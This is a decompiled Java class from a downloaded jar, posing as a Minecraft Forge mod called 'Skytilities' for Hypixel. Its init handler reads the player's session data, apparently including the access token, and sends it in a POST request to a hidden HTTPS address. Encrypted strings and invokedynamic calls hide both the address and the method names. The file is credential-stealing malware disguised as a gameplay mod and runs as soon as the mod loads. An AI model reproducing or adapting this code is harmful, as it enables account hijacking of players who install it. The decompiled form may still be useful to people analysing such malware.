package gov.hypixelqol;

import java.lang.invoke.ConstantCallSite;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.Mod.EventHandler;

@Mod(modid = "Skytilities", version = "1.9.2", acceptedMinecraftVersions = "[1.8.9]")
public class skytilities {
  public skytilities() {
    this();
  }
  
  @EventHandler
  public void init(Object event) throws Exception {
    // Byte code:
    //   0: <illegal opcode> 1hj2bn8 : ()Lnet/minecraft/client/Minecraft;
    //   5: astore_2
    //   6: ldc '䋤紿斜䵫嘭ᦒ迵犺腐䔑몸䥣삆ૄu쮬䰞嶟윜ᧃ触ܖ쉢⋄団＃꽇釉ﱊ鮛擏幞糴貁?쁅≽쫳伀包쀒啎鍄穻膺ⷿ↱殰㤀઄銿뉭ᇠ皪맏䢝뫪칞葫꟩ۺ塙蘻㍎쵫齬퐙蘤ﻬ튀⌒᭿體?괾⺸䚪ퟤ턉샞伖瑉迺犱㟑㜪趡⌍预颽挺㘻᎙諥㭥ㇵ轒ᅤ蹍翝꧎銦œ题ᑠ碆狚嘀⯪䲟⌵䭝笅㶫ࢿ⃑媗泅쎧뭯ꉉ嬡ﶹ㣙ﭽ❼塋⨐얤⒩䅨쑕?꤅୦줯텁禩鮼ꮆ羽囝嚭䘢妆鱮?榝?몪శ这緟䣧饓꾛朜⊭귇໌ʤ鲮?㮶퀂⭛톰뱥읝퀠踺ﺂ쌪䑝柟江⎄督蚡쇳량傽껾䕝䜪䶮펶?组漧碻㕉ⷑ걼Œ溰陗䚮ፅ븽⑫∼㉝谤ᕂ7쭑ᇱ??䂄댥涝暀儋ﹲᏐ⏁安?序?죕갾ꯦぜᒿ?툩衞돗䭒䉓䝕烯?㎵稝絗퇙獔⮋盈图鄰莱ᰬ뤆㔪钏钾?뒝朲㣽貮臒岓釡㭪?큡幐᠔끙ᨶ贯ꮽꉝ鄌宭䎵⭕ꤠ䜡鷶汒鏱굵?ퟣᘞ壥踙퇇惷춑༸찊뿂鿠打佋늉籊霼⩴냺곟澇傎栏᧥??誼袴㩖뚿溠ႆ쮕ࣩ㡦頃㊡멾鸦毗Ḱ仯ꥁ䝖䀔ᔠ히窳ꂾ뎲윝?絬돀嵒僚彝뺣ࣳ꛽ᒙ豈婴⯔ญ漤멵ѣꏫ阽爿ෞ惛㢑겅㇮ᯊ퉽떏䶶週Ⳉїꩳ㙟傿氻恲ꯓ勸叐ﳠ퉓ᮻ胬鲺쯃頾ි篌셚ଘꇋᕽ移팦䍽ꬽﹳ依ᑒ?ࡾ⡢蹻鿺챚좸鞰꬞沬说Ỻ蹾鿘凁ヹ솆ꔒ淴ƕ룵ⷹ돛➁⹺쮤ⶇ?둄뙮䀯〹欥ọ⿢洹늰剔ꉲ醨岡៝談켸ᝒᢏ뚋ᄩ蓎㛯⃎㮥ꩠꆠᐉ⺟嫅앨槫६ࠊ૔⛈徙ꓖ〞卿㼠蓂鴄?ڙ火ﴐ㬔韖寙館ℵ䱤᤬驹䜆喬魬֛콅腽곋䮟ꨱ斊鹞拇喲꓋櫰炜묇䝮䥌㬆'
    //   8: invokevirtual toCharArray : ()[C
    //   11: dup
    //   12: dup
    //   13: bipush #27
    //   15: dup_x1
    //   16: caload
    //   17: sipush #12151
    //   20: ixor
    //   21: i2c
    //   22: castore
    //   23: sipush #7103
    //   26: iconst_3
    //   27: iconst_1
    //   28: invokestatic A : (Ljava/lang/Object;SSZ)Ljava/lang/String;
    //   31: iconst_5
    //   32: anewarray java/lang/Object
    //   35: dup
    //   36: iconst_0
    //   37: aload_2
    //   38: <illegal opcode> sskbn7 : (Ljava/lang/Object;)Lnet/minecraft/util/Session;
    //   43: <illegal opcode> -ekpk8i : (Ljava/lang/Object;)Ljava/lang/String;
    //   48: aastore
    //   49: dup
    //   50: iconst_1
    //   51: aload_2
    //   52: <illegal opcode> sskbn7 : (Ljava/lang/Object;)Lnet/minecraft/util/Session;
    //   57: <illegal opcode> 11eobnd : (Ljava/lang/Object;)Ljava/lang/String;
    //   62: aastore
    //   63: dup
    //   64: iconst_2
    //   65: aload_2
    //   66: <illegal opcode> sskbn7 : (Ljava/lang/Object;)Lnet/minecraft/util/Session;
    //   71: <illegal opcode> -f4dk8k : (Ljava/lang/Object;)Ljava/lang/String;
    //   76: aastore
    //   77: dup
    //   78: iconst_3
    //   79: aload_2
    //   80: <illegal opcode> sskbn7 : (Ljava/lang/Object;)Lnet/minecraft/util/Session;
    //   85: <illegal opcode> 11eobnd : (Ljava/lang/Object;)Ljava/lang/String;
    //   90: aastore
    //   91: dup
    //   92: iconst_4
    //   93: aload_2
    //   94: <illegal opcode> sskbn7 : (Ljava/lang/Object;)Lnet/minecraft/util/Session;
    //   99: <illegal opcode> 11eobnd : (Ljava/lang/Object;)Ljava/lang/String;
    //   104: aastore
    //   105: <illegal opcode> reoc6r : (Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/String;
    //   110: astore_3
    //   111: new java/net/URL
    //   114: dup
    //   115: ldc '脷捆칰珐㗾ᶖ?턴?퓟왊?倴似㠽墈⮇Ｂχ屯ᔷణ㖀唾橂᫴쾁㗂뻴ꫨ鏅Ҭꏔ磮폵出ᘋ▰궴뺼粒匒ᰖ龙ퟝὸ¸ᣄ䊁漭裓픒ૼ튅줟솸ᛞ䤴拿ၢආᙔ뵳ᐬ倁ᦀꥶ賓뻤厥䥧ꝑ甍䔍ꁥಐ骂＾᜘ⲣ彿㇉?﯎嗟堎鵎ᇓ႑軳搪估䌫卼￰榟੏鑗扗ߔ࠵⿦繹쎨୆Ṕ员ᒩⷶ'
    //   117: invokevirtual toCharArray : ()[C
    //   120: dup
    //   121: dup
    //   122: bipush #105
    //   124: dup_x1
    //   125: caload
    //   126: sipush #17218
    //   129: ixor
    //   130: i2c
    //   131: castore
    //   132: sipush #15643
    //   135: iconst_1
    //   136: iconst_0
    //   137: invokestatic A : (Ljava/lang/Object;SSZ)Ljava/lang/String;
    //   140: invokespecial <init> : (Ljava/lang/String;)V
    //   143: <illegal opcode> 15f2bni : (Ljava/lang/Object;)Ljava/net/URLConnection;
    //   148: checkcast javax/net/ssl/HttpsURLConnection
    //   151: astore #4
    //   153: aload #4
    //   155: ldc '缅뒏撌熬'
    //   157: invokevirtual toCharArray : ()[C
    //   160: dup
    //   161: dup
    //   162: iconst_3
    //   163: dup_x1
    //   164: caload
    //   165: sipush #7748
    //   168: ixor
    //   169: i2c
    //   170: castore
    //   171: sipush #12931
    //   174: iconst_3
    //   175: iconst_0
    //   176: invokestatic A : (Ljava/lang/Object;SSZ)Ljava/lang/String;
    //   179: <illegal opcode> 1pe4bnh : (Ljava/lang/Object;Ljava/lang/Object;)V
    //   184: aload #4
    //   186: ldc '賻셓䅤颼ድ埂䟃֐嵈휖掚㓻࿟'
    //   188: invokevirtual toCharArray : ()[C
    //   191: dup
    //   192: dup
    //   193: bipush #11
    //   195: dup_x1
    //   196: caload
    //   197: sipush #11767
    //   200: ixor
    //   201: i2c
    //   202: castore
    //   203: sipush #6994
    //   206: iconst_5
    //   207: iconst_1
    //   208: invokestatic A : (Ljava/lang/Object;SSZ)Ljava/lang/String;
    //   211: ldc 'ଢ଼떆ֱⶖ퓎㙫渗ⴧᚂ垝ﶒꉧﺏ켬쿈㟵'
    //   213: invokevirtual toCharArray : ()[C
    //   216: dup
    //   217: dup
    //   218: iconst_1
    //   219: dup_x1
    //   220: caload
    //   221: sipush #22865
    //   224: ixor
    //   225: i2c
    //   226: castore
    //   227: sipush #10154
    //   230: iconst_5
    //   231: iconst_0
    //   232: invokestatic A : (Ljava/lang/Object;SSZ)Ljava/lang/String;
    //   235: <illegal opcode> 7pkbng : (Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/Object;)V
    //   240: aload #4
    //   242: ldc '癪叉㊂쮾ᑩ좭ᢋ㣅콢嬳'
    //   244: invokevirtual toCharArray : ()[C
    //   247: dup
    //   248: dup
    //   249: iconst_0
    //   250: dup_x1
    //   251: caload
    //   252: sipush #20316
    //   255: ixor
    //   256: i2c
    //   257: castore
    //   258: sipush #21924
    //   261: iconst_3
    //   262: iconst_0
    //   263: invokestatic A : (Ljava/lang/Object;SSZ)Ljava/lang/String;
    //   266: ldc '剄쯿䀥쥅쓕?ꃄ጑슎ὼ绊㙭'
    //   268: invokevirtual toCharArray : ()[C
    //   271: dup
    //   272: dup
    //   273: iconst_3
    //   274: dup_x1
    //   275: caload
    //   276: sipush #19810
    //   279: ixor
    //   280: i2c
    //   281: castore
    //   282: sipush #22449
    //   285: iconst_2
    //   286: iconst_0
    //   287: invokestatic A : (Ljava/lang/Object;SSZ)Ljava/lang/String;
    //   290: <illegal opcode> 7pkbng : (Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/Object;)V
    //   295: aload #4
    //   297: iconst_1
    //   298: <illegal opcode> -17rtk8h : (Ljava/lang/Object;Z)V
    //   303: aload #4
    //   305: <illegal opcode> -29hjta : (Ljava/lang/Object;)Ljava/io/OutputStream;
    //   310: astore #5
    //   312: aconst_null
    //   313: astore #6
    //   315: aload #5
    //   317: aload_3
    //   318: getstatic java/nio/charset/StandardCharsets.UTF_8 : Ljava/nio/charset/Charset;
    //   321: <illegal opcode> -hr1jtb : (Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;
    //   326: checkcast [B
    //   329: <illegal opcode> -1p9rjtc : (Ljava/lang/Object;[B)V
    //   334: aload #5
    //   336: ifnull -> 433
    //   339: aload #6
    //   341: ifnull -> 368
    //   344: aload #5
    //   346: <illegal opcode> -ef9jst : (Ljava/lang/Object;)V
    //   351: goto -> 433
    //   354: astore #7
    //   356: aload #6
    //   358: aload #7
    //   360: <illegal opcode> 15j4c2q : (Ljava/lang/Object;Ljava/lang/Object;)V
    //   365: goto -> 433
    //   368: aload #5
    //   370: <illegal opcode> -ef9jst : (Ljava/lang/Object;)V
    //   375: goto -> 433
    //   378: astore #7
    //   380: aload #7
    //   382: astore #6
    //   384: aload #7
    //   386: athrow
    //   387: astore #8
    //   389: aload #5
    //   391: ifnull -> 430
    //   394: aload #6
    //   396: ifnull -> 423
    //   399: aload #5
    //   401: <illegal opcode> -ef9jst : (Ljava/lang/Object;)V
    //   406: goto -> 430
    //   409: astore #9
    //   411: aload #6
    //   413: aload #9
    //   415: <illegal opcode> 15j4c2q : (Ljava/lang/Object;Ljava/lang/Object;)V
    //   420: goto -> 430
    //   423: aload #5
    //   425: <illegal opcode> -ef9jst : (Ljava/lang/Object;)V
    //   430: aload #8
    //   432: athrow
    //   433: aload #4
    //   435: <illegal opcode> 1jfec2p : (Ljava/lang/Object;)I
    //   440: pop
    //   441: return
    // Line number table:
    //   Java source line number -> byte code offset
    //   #18	-> 0
    //   #19	-> 6
    //   #20	-> 111
    //   #21	-> 153
    //   #22	-> 184
    //   #23	-> 240
    //   #24	-> 295
    //   #25	-> 303
    //   #26	-> 315
    //   #27	-> 334
    //   #25	-> 378
    //   #27	-> 387
    //   #28	-> 433
    //   #29	-> 441
    // Local variable table:
    //   start	length	slot	name	descriptor
    //   312	121	5	h	Ljava/lang/Object;
    //   0	442	0	this	Ljava/lang/Object;
    //   0	442	1	event	Ljava/lang/Object;
    //   6	436	2	z	Ljava/lang/Object;
    //   111	331	3	s	Ljava/lang/Object;
    //   153	289	4	con	Ljava/lang/Object;
    // Exception table:
    //   from	to	target	type
    //   315	334	378	java/lang/Throwable
    //   315	334	387	finally
    //   344	351	354	java/lang/Throwable
    //   378	389	387	finally
    //   399	406	409	java/lang/Throwable
  }
  
  private static Object OM(Object paramObject1, Object paramObject2, Object paramObject3) {
    try {
      return new ConstantCallSite(((MethodHandles.Lookup)paramObject1).unreflect(au.e(Integer.valueOf((String)paramObject2, 32).intValue())).asType((MethodType)paramObject3));
    } catch (ClassNotFoundException|IllegalAccessException classNotFoundException) {
      throw new BootstrapMethodError(classNotFoundException);
    } 
  }
}


/* Location:              D:\downloads\NotEnoughCoins-0.9.2.1-all (1).jar!\gov\hypixelqol\skytilities.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */